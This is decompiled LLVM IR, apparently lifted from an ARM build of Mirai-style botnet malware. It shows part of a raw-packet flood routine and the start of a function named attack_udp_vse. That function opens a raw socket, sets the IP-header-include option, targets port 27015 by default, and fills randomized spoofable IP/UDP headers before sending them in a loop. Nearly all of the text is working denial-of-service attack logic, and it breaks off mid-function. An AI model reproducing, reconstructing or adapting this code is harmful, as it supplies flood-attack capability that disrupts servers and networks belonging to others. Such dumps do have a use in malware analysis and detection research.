dec_label_pc_bba0.preheader:                      ; preds = %.thread, %dec_label_pc_bba0.preheader.loopexit
  %v0_bba4.pre = phi i32 [ %v0_bba4.pre.pre, %dec_label_pc_bba0.preheader.loopexit ], [ 0, %.thread ]
  %v3_bd0c = icmp eq i32 %v6_b9cc, -1
  %v8_bd0c = icmp eq i32 %v6_b9cc, -1
  %v3_bd24 = icmp eq i32 %v3_ba5c, 65535
  %v2_bd60 = icmp eq i32 %v1_b9b8, 0
  br label %dec_label_pc_bba0

dec_label_pc_bba0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0, %dec_label_pc_bba0.preheader
  %v0_bba4 = phi i32 [ %v0_bba4.pre, %dec_label_pc_bba0.preheader ], [ 0, %dec_label_pc_bca0 ], [ 0, %dec_label_pc_bba0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bba4 = icmp eq i32 %v0_bba4, 0
  store i1 %v2_bba4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bba4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bbb0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbb4

dec_label_pc_bbb4:                                ; preds = %dec_label_pc_bc1c, %dec_label_pc_bbb0
  %v1_bbc8 = phi i32 [ %v1_bc90, %dec_label_pc_bc1c ], [ 0, %dec_label_pc_bbb0 ]
  %v5_bbb8 = mul i32 %v1_bbc8, 24
  %v1_bbbc = load i32, i32* @r8, align 4
  %v2_bbbc = add i32 %v1_bbbc, %v5_bbb8
  store i32 %v2_bbbc, i32* %r3.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r1.global-to-local, align 4
  %v1_bbc4 = add i32 %v2_bbbc, 20
  %v2_bbc4 = inttoptr i32 %v1_bbc4 to i8*
  %v3_bbc4 = load i8, i8* %v2_bbc4, align 1
  %v4_bbc4 = zext i8 %v3_bbc4 to i32
  store i32 %v4_bbc4, i32* %r2.global-to-local, align 4
  %v4_bbc8 = mul i32 %v1_bbc8, 4
  %v5_bbc8 = add i32 %v4_bbc8, %v2_b8c4
  %v6_bbc8 = inttoptr i32 %v5_bbc8 to i32*
  %v7_bbc8 = load i32, i32* %v6_bbc8, align 4
  store i32 %v7_bbc8, i32* @r5, align 4
  %v7_bbcc = icmp eq i8 %v3_bbc4, 31
  store i1 %v7_bbcc, i1* %cpsr_z.global-to-local, align 1
  %v1_bbd0 = add i32 %v7_bbc8, 20
  store i32 %v1_bbd0, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_bbc4, 32
  br i1 %tmp62, label %dec_label_pc_bcb4, label %dec_label_pc_bbd8

dec_label_pc_bbd8:                                ; preds = %dec_label_pc_bbb4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bbe4:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bd24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bbf8

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge, %dec_label_pc_bbe4
  %v1_bbfc = phi i32 [ %v1_bbfc.pre, %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge ], [ 65535, %dec_label_pc_bbe4 ]
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v9_bbfc = icmp eq i32 %v3_ba3c, %v1_bbfc
  store i1 %v9_bbfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbfc, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bc04:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v1_bc08 = phi i32 [ %v1_bd3c, %dec_label_pc_bd30 ], [ %v1_bbfc, %dec_label_pc_bbf8 ]
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v9_bc08 = icmp eq i32 %v3_ba54, %v1_bc08
  store i1 %v9_bc08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bc08, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bc10:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bc1c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58, %dec_label_pc_bd6c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_bc20 = load i32, i32* @r5, align 4
  %v3_bc20 = add i32 %v2_bc20, 10
  %v4_bc20 = inttoptr i32 %v3_bc20 to i16*
  store i16 0, i16* %v4_bc20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bc28 = load i32, i32* @r5, align 4
  store i32 %v0_bc28, i32* @r0, align 4
  %v2_bc2c = call i32 @checksum_generic(i32 %v0_bc28, i32 20)
  %v3_bc2c = trunc i32 %v2_bc2c to i16
  %v3_bc30 = load i32, i32* @r5, align 4
  %v4_bc30 = add i32 %v3_bc30, 10
  %v5_bc30 = inttoptr i32 %v4_bc30 to i16*
  store i16 %v3_bc2c, i16* %v5_bc30, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bc38 = load i32, i32* @r6, align 4
  %v3_bc38 = add i32 %v2_bc38, 6
  %v4_bc38 = inttoptr i32 %v3_bc38 to i16*
  store i16 0, i16* %v4_bc38, align 2
  %v0_bc3c = load i32, i32* @r6, align 4
  store i32 %v0_bc3c, i32* @r1, align 4
  %v1_bc40 = add i32 %v0_bc3c, 4
  %v2_bc40 = inttoptr i32 %v1_bc40 to i16*
  %v3_bc40 = load i16, i16* %v2_bc40, align 2
  %v4_bc40 = zext i16 %v3_bc40 to i32
  store i32 %v4_bc40, i32* %r2.global-to-local, align 4
  %v0_bc44 = load i32, i32* @sl, align 4
  store i32 %v0_bc44, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r5, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v4_bc4c = call i32 @checksum_tcpudp(i32 %v0_bc48, i32 %v0_bc3c, i32 %v4_bc40, i32 %v0_bc44)
  %v5_bc4c = trunc i32 %v4_bc4c to i16
  store i32 %v4_bc4c, i32* %r0.global-to-local, align 4
  %v3_bc50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc50, i32* %r3.global-to-local, align 4
  %v3_bc54 = mul i32 %v3_bc50, 32
  store i32 %v3_bc54, i32* %lr.global-to-local, align 4
  %v3_bc58 = load i32, i32* @r6, align 4
  %v4_bc58 = add i32 %v3_bc58, 6
  %v5_bc58 = inttoptr i32 %v4_bc58 to i16*
  store i16 %v5_bc4c, i16* %v5_bc58, align 2
  %v0_bc5c = load i32, i32* %lr.global-to-local, align 4
  %v1_bc5c = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_bc5c, -8
  %v5_bc5c = add i32 %v0_bc5c, %tmp63
  store i32 %v5_bc5c, i32* %lr.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r6, align 4
  %v1_bc60 = add i32 %v0_bc60, 2
  %v2_bc60 = inttoptr i32 %v1_bc60 to i16*
  %v3_bc60 = load i16, i16* %v2_bc60, align 2
  %v4_bc60 = zext i16 %v3_bc60 to i32
  store i32 %v4_bc60, i32* @r6, align 4
  %v1_bc64 = load i32, i32* @r8, align 4
  %v2_bc64 = add i32 %v1_bc64, %v5_bc5c
  store i32 %v2_bc64, i32* @lr, align 4
  %v3_bc68 = add i32 %v2_bc64, 2
  %v4_bc68 = inttoptr i32 %v3_bc68 to i16*
  store i16 %v3_bc60, i16* %v4_bc68, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc74 = load i32, i32* @r5, align 4
  store i32 %v0_bc74, i32* %r1.global-to-local, align 4
  %v0_bc78 = load i32, i32* @fp, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v0_bc7c = load i32, i32* @sb, align 4
  store i32 %v0_bc7c, i32* %r2.global-to-local, align 4
  %v0_bc80 = load i32, i32* @lr, align 4
  %v6_bc88 = call i32 @__libc_sendto(i32 %v0_bc78, i32 %v0_bc74, i32 %v0_bc7c, i32 16384, i32 %v0_bc80, i32 16)
  %v3_bc8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc8c, i32* %r3.global-to-local, align 4
  %v1_bc90 = add i32 %v3_bc8c, 1
  store i32 %v1_bc90, i32* %r0.global-to-local, align 4
  %v1_bc94 = load i32, i32* @r7, align 4
  %v9_bc94 = icmp eq i32 %v1_bc90, %v1_bc94
  store i1 %v9_bc94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc90, i32* %stack_var_-44, align 4
  %v5_bc9c = icmp slt i32 %v1_bc90, %v1_bc94
  br i1 %v5_bc9c, label %dec_label_pc_bbb4, label %dec_label_pc_bca0

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bc1c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bca4 = icmp eq i32 %v1_bc94, 0
  store i1 %v2_bca4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bca4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_bbb4
  %v1_bcb4 = add i32 %v2_bbbc, 16
  %v2_bcb4 = inttoptr i32 %v1_bcb4 to i32*
  %v3_bcb4 = load i32, i32* %v2_bcb4, align 4
  %v0_bcb8 = call i32 @rand_next()
  store i32 %v0_bcb8, i32* %r0.global-to-local, align 4
  %v3_bcbc = load i32, i32* %stack_var_-44, align 4
  %v5_bcc4 = mul i32 %v3_bcbc, 24
  %v1_bcc8 = and i32 %v3_bcb4, 16711680
  store i32 %v1_bcc8, i32* %ip.global-to-local, align 4
  %v3_bccc = udiv i32 %v3_bcb4, 16777216
  %v4_bcd0 = udiv i32 %v1_bcc8, 256
  %v5_bcd0 = or i32 %v4_bcd0, %v3_bccc
  store i32 %v5_bcd0, i32* %r2.global-to-local, align 4
  %v1_bcd4 = load i32, i32* @r8, align 4
  %v2_bcd4 = add i32 %v1_bcd4, %v5_bcc4
  store i32 %v2_bcd4, i32* %r1.global-to-local, align 4
  %v1_bcd8 = and i32 %v3_bcb4, 65280
  store i32 %v1_bcd8, i32* %r3.global-to-local, align 4
  %v1_bcdc = add i32 %v2_bcd4, 20
  %v2_bcdc = inttoptr i32 %v1_bcdc to i8*
  %v3_bcdc = load i8, i8* %v2_bcdc, align 1
  %v4_bcdc = zext i8 %v3_bcdc to i32
  store i32 %v4_bcdc, i32* %ip.global-to-local, align 4
  %v5_bce4 = call i32 @llvm.bswap.i32(i32 %v3_bcb4)
  %v7_bce8 = lshr i32 %v0_bcb8, %v4_bcdc
  %v8_bce8 = add i32 %v7_bce8, %v5_bce4
  store i32 %v8_bce8, i32* %r2.global-to-local, align 4
  %v1_bcec = and i32 %v8_bce8, 16711680
  store i32 %v1_bcec, i32* %r0.global-to-local, align 4
  %v1_bcf8 = and i32 %v8_bce8, 65280
  store i32 %v1_bcf8, i32* %r1.global-to-local, align 4
  %v5_bd00 = call i32 @llvm.bswap.i32(i32 %v8_bce8)
  %v1_bd04 = load i32, i32* @r5, align 4
  %v2_bd04 = add i32 %v1_bd04, 16
  %v3_bd04 = inttoptr i32 %v2_bd04 to i32*
  store i32 %v5_bd00, i32* %v3_bd04, align 4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bd14:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  %v0_bd14 = call i32 @rand_next()
  store i32 %v0_bd14, i32* %r0.global-to-local, align 4
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bd24, i1* %cpsr_z.global-to-local, align 1
  %v1_bd28 = load i32, i32* @r5, align 4
  %v2_bd28 = add i32 %v1_bd28, 12
  %v3_bd28 = inttoptr i32 %v2_bd28 to i32*
  store i32 %v0_bd14, i32* %v3_bd28, align 4
  br i1 %v3_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge

dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge:    ; preds = %dec_label_pc_bd14
  %v1_bbfc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bbf8

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd14, %dec_label_pc_bbe4
  %v0_bd30 = call i32 @rand_next()
  %v1_bd30 = trunc i32 %v0_bd30 to i16
  %v3_bd34 = load i32, i32* @r5, align 4
  %v4_bd34 = add i32 %v3_bd34, 4
  %v5_bd34 = inttoptr i32 %v4_bd34 to i16*
  store i16 %v1_bd30, i16* %v5_bd34, align 2
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v1_bd3c = load i32, i32* @r4, align 4
  %v9_bd3c = icmp eq i32 %v3_ba3c, %v1_bd3c
  store i1 %v9_bd3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd3c, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v0_bd44 = call i32 @rand_next()
  %v1_bd44 = trunc i32 %v0_bd44 to i16
  store i32 %v0_bd44, i32* %r0.global-to-local, align 4
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v1_bd4c = load i32, i32* @r4, align 4
  %v9_bd4c = icmp eq i32 %v3_ba54, %v1_bd4c
  store i1 %v9_bd4c, i1* %cpsr_z.global-to-local, align 1
  %v3_bd50 = load i32, i32* @r5, align 4
  %v4_bd50 = add i32 %v3_bd50, 20
  %v5_bd50 = inttoptr i32 %v4_bd50 to i16*
  store i16 %v1_bd44, i16* %v5_bd50, align 2
  br i1 %v9_bd4c, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  %v0_bd58 = call i32 @rand_next()
  %v1_bd58 = trunc i32 %v0_bd58 to i16
  store i32 %v0_bd58, i32* %r0.global-to-local, align 4
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  %v3_bd64 = load i32, i32* @r6, align 4
  %v4_bd64 = add i32 %v3_bd64, 2
  %v5_bd64 = inttoptr i32 %v4_bd64 to i16*
  store i16 %v1_bd58, i16* %v5_bd64, align 2
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bd6c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58
  %v0_bd6c = load i32, i32* @r5, align 4
  %v1_bd6c = add i32 %v0_bd6c, 28
  store i32 %v1_bd6c, i32* %r0.global-to-local, align 4
  store i32 %v0_ba84, i32* %r1.global-to-local, align 4
  %v2_bd74 = inttoptr i32 %v1_bd6c to i16*
  %v3_bd74 = call i32 @rand_str(i16* %v2_bd74, i32 %v0_ba84)
  store i32 %v3_bd74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bc1c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_b9f0
  %v0_bd7c = load i32, i32* @fp, align 4
  store i32 %v0_bd7c, i32* %r0.global-to-local, align 4
  %v1_bd80 = call i32 @__GI___libc_close(i32 %v0_bd7c)
  store i32 %v1_bd80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd84

dec_label_pc_bd84:                                ; preds = %entry, %dec_label_pc_bd7c
  %v1_bd8c = phi i32 [ %v3_b9e0, %entry ], [ %v1_bd80, %dec_label_pc_bd7c ]
  store i32 %v18_b8a8, i32* %sb.global-to-local, align 4
  store i32 %v27_b8a8, i32* %lr.global-to-local, align 4
  ret i32 %v1_bd8c

; uselistorder directives
  uselistorder i32 %v0_bd58, { 1, 0 }
  uselistorder i32 %v0_bd44, { 1, 0 }
  uselistorder i32 %v1_bd3c, { 1, 0 }
  uselistorder i32 %v3_bcb4, { 2, 1, 3, 0 }
  uselistorder i32 %v1_bc90, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bc5c, { 1, 0 }
  uselistorder i32 %v4_bc4c, { 1, 0 }
  uselistorder i1 %v2_bd60, { 2, 3, 1, 0 }
  uselistorder i1 %v3_bd24, { 3, 2, 0, 1 }
  uselistorder i32 %v3_bad0, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_bab8, { 1, 0 }
  uselistorder i32 %v1_ba88, { 1, 0, 2 }
  uselistorder i32 %v1_ba84, { 1, 0, 2 }
  uselistorder i32 %v3_ba5c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ba44, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ba3c, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_ba34, { 1, 0, 2 }
  uselistorder i32 %v0_ba84, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_ba24, { 3, 1, 2, 0 }
  uselistorder i1 %v7_ba10, { 1, 0 }
  uselistorder i1 %v7_b9e4, { 1, 0 }
  uselistorder i32 %v3_b9e0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b9cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_b9b8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v1_b944, { 1, 2, 0 }
  uselistorder i32 %v1_b920, { 2, 1, 0 }
  uselistorder i32 %v6_b918, { 1, 0 }
  uselistorder i32 %v7_b900, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_b8dc, { 2, 1, 3, 0 }
  uselistorder i32 %v2_b8c4, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 (i16*, i32)* @rand_str, { 0, 1, 2, 10, 3, 4, 5, 6, 9, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bd84, { 1, 0 }
  uselistorder label %dec_label_pc_bd6c, { 1, 0 }
  uselistorder label %dec_label_pc_bc1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bbb0, { 1, 0 }
  uselistorder label %dec_label_pc_bba0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bba0.preheader, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_bd94 = load i32, i32* @r4, align 4
  %v27_bd94 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_bdb0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bdb4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_bdb0, i32* @fp, align 4
  %v0_bdc4 = load i32, i32* @r4, align 4
  %v5_bdc8 = inttoptr i32 %v0_bdb4 to i32*
  %v6_bdc8 = call i32 @attack_get_opt_int(i32 %v0_bdc4, i32* %v5_bdc8, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_bdd4 = urem i32 %v6_bdc8, 256
  store i32 %v1_bdd4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bde0 = load i32, i32* @r4, align 4
  %v0_bde4 = load i32, i32* @r5, align 4
  %v5_bde8 = trunc i32 %v6_bdc8 to i8
  %v6_bdec = inttoptr i32 %v0_bde4 to i32*
  %v7_bdec = call i32 @attack_get_opt_int(i32 %v0_bde0, i32* %v6_bdec, i32 3, i32 65535, i32 %v6_bdc8)
  %v0_bdf0 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bdec, i32* @r7, align 4
  %v0_be00 = load i32, i32* @r4, align 4
  %v5_be04 = inttoptr i32 %v0_bdf0 to i32*
  %v6_be04 = call i32 @attack_get_opt_int(i32 %v0_be00, i32* %v5_be04, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_be0c = urem i32 %v6_be04, 256
  store i32 %v1_be0c, i32* %ip.global-to-local, align 4
  %v0_be10 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_be1c = load i32, i32* @r4, align 4
  %sext = mul i32 %v6_be04, 16777216
  %v5_be24 = sdiv i32 %sext, 16777216
  %v6_be24 = inttoptr i32 %v0_be10 to i32*
  %v7_be24 = call i32 @attack_get_opt_int(i32 %v0_be1c, i32* %v6_be24, i32 5, i32 0, i32 %v5_be24)
  %v1_be30 = urem i32 %v7_be24, 256
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_be3c = load i32, i32* @r4, align 4
  %v0_be40 = load i32, i32* @r5, align 4
  %v5_be48 = inttoptr i32 %v0_be40 to i32*
  %v6_be48 = call i32 @attack_get_opt_int(i32 %v0_be3c, i32* %v5_be48, i32 6, i32 65535, i32 %v1_be30)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_be58 = load i32, i32* @r5, align 4
  store i32 %v6_be48, i32* @r6, align 4
  %v0_be60 = load i32, i32* @r4, align 4
  %v5_be64 = inttoptr i32 %v0_be58 to i32*
  %v6_be64 = call i32 @attack_get_opt_int(i32 %v0_be60, i32* %v5_be64, i32 7, i32 27015, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_be64, i32* @r4, align 4
  %v1_be70 = call i32 @table_unlock_val(i32 22)
  %v3_be7c = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_be90 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_be94 = icmp eq i32 %v3_be90, -1
  store i1 %v7_be94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_be90, i32* @sb, align 4
  br i1 %v7_be94, label %dec_label_pc_c1bc, label %dec_label_pc_bea0

dec_label_pc_bea0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bea8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bea8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bebc = call i32 @__GI_setsockopt(i32 %v3_be90, i32 0, i32 3, i32 %v6_bea8, i32 ptrtoint (i32* @0 to i32))
  %v7_bec0 = icmp eq i32 %v5_bebc, -1
  store i1 %v7_bec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bec0, label %dec_label_pc_c1b4, label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bea0
  %v0_bec8 = load i32, i32* @r4, align 4
  %v3_bec8 = mul i32 %v0_bec8, 65536
  store i32 %v3_bec8, i32* @lr, align 4
  %v0_becc = load i32, i32* @r7, align 4
  %v0_bed0 = load i32, i32* @r6, align 4
  %v3_bed0 = mul i32 %v0_bed0, 65536
  store i32 %v3_bed0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_bed8 = urem i32 %v0_becc, 65536
  %v3_bedc = urem i32 %v0_bed0, 65536
  store i32 %v3_bedc, i32* %r2.global-to-local, align 4
  %v3_bee0 = urem i32 %v0_bec8, 65536
  store i32 %v3_bee0, i32* %r3.global-to-local, align 4
  %v0_bee4 = load i32, i32* @r8, align 4
  %v2_bee4 = icmp eq i32 %v0_bee4, 0
  store i1 %v2_bee4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bee4, label %dec_label_pc_c020.preheader, label %dec_label_pc_befc

dec_label_pc_befc:                                ; preds = %dec_label_pc_bec8
  %tmp33 = mul i32 %v0_becc, 256
  %v3_bf0c = and i32 %tmp33, 65280
  store i32 %v3_bf0c, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v0_bed0, 256
  %v3_bf10 = and i32 %tmp34, 65280
  store i32 %v3_bf10, i32* %r2.global-to-local, align 4
  %tmp35 = mul i32 %v0_bec8, 256
  %v3_bf14 = and i32 %tmp35, 65280
  %tmp36 = udiv i32 %v0_becc, 256
  %v4_bf18 = urem i32 %tmp36, 256
  %v5_bf18 = or i32 %v4_bf18, %v3_bf0c
  store i32 %v5_bf18, i32* @r5, align 4
  %tmp37 = udiv i32 %v0_bed0, 256
  %v4_bf1c = urem i32 %tmp37, 256
  %v5_bf1c = or i32 %v4_bf1c, %v3_bf10
  store i32 %v5_bf1c, i32* @r6, align 4
  %tmp38 = udiv i32 %v0_bec8, 256
  %v4_bf20 = urem i32 %tmp38, 256
  %v5_bf20 = or i32 %v4_bf20, %v3_bf14
  store i32 %v5_bf20, i32* @r7, align 4
  %v1_bfa8 = trunc i32 %v5_be24 to i8
  br label %dec_label_pc_bf24

dec_label_pc_bf24:                                ; preds = %.thread, %dec_label_pc_befc
  %v2_bf2c = call i32 @calloc(i32 128, i32 1)
  %v3_bf30 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf30, i32* %r2.global-to-local, align 4
  %v5_bf38 = mul i32 %v3_bf30, 24
  store i32 %v5_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = load i32, i32* @fp, align 4
  %v2_bf3c = load i32, i32* @r4, align 4
  %v5_bf3c = mul i32 %v2_bf3c, 4
  %v6_bf3c = add i32 %v5_bf3c, %v1_bf3c
  %v7_bf3c = inttoptr i32 %v6_bf3c to i32*
  store i32 %v2_bf2c, i32* %v7_bf3c, align 4
  %v0_bf40 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf40 = load i32, i32* @sl, align 4
  %v2_bf40 = add i32 %v1_bf40, %v0_bf40
  store i32 %v2_bf40, i32* %r3.global-to-local, align 4
  %v0_bf44 = load i32, i32* @fp, align 4
  %v1_bf44 = load i32, i32* %r2.global-to-local, align 4
  %v4_bf44 = mul i32 %v1_bf44, 4
  %v5_bf44 = add i32 %v4_bf44, %v0_bf44
  %v6_bf44 = inttoptr i32 %v5_bf44 to i32*
  %v7_bf44 = load i32, i32* %v6_bf44, align 4
  store i32 %v7_bf44, i32* @lr, align 4
  %v1_bf4c = inttoptr i32 %v7_bf44 to i8*
  %v2_bf4c = load i8, i8* %v1_bf4c, align 1
  %tmp = urem i8 %v2_bf4c, 16
  %v1_bf50 = zext i8 %tmp to i32
  %v1_bf54 = or i32 %v1_bf50, 64
  store i32 %v1_bf54, i32* %r3.global-to-local, align 4
  %v1_bf5c = trunc i32 %v1_bf54 to i8
  store i8 %v1_bf5c, i8* %v1_bf4c, align 1
  %v0_bf60 = load i32, i32* @lr, align 4
  %v1_bf60 = inttoptr i32 %v0_bf60 to i8*
  %v2_bf60 = load i8, i8* %v1_bf60, align 1
  %v1_bf64 = and i8 %v2_bf60, -16
  %v1_bf68 = or i8 %v1_bf64, 5
  store i8 %v1_bf68, i8* %v1_bf60, align 1
  %v2_bf74 = load i32, i32* @lr, align 4
  %v3_bf74 = add i32 %v2_bf74, 1
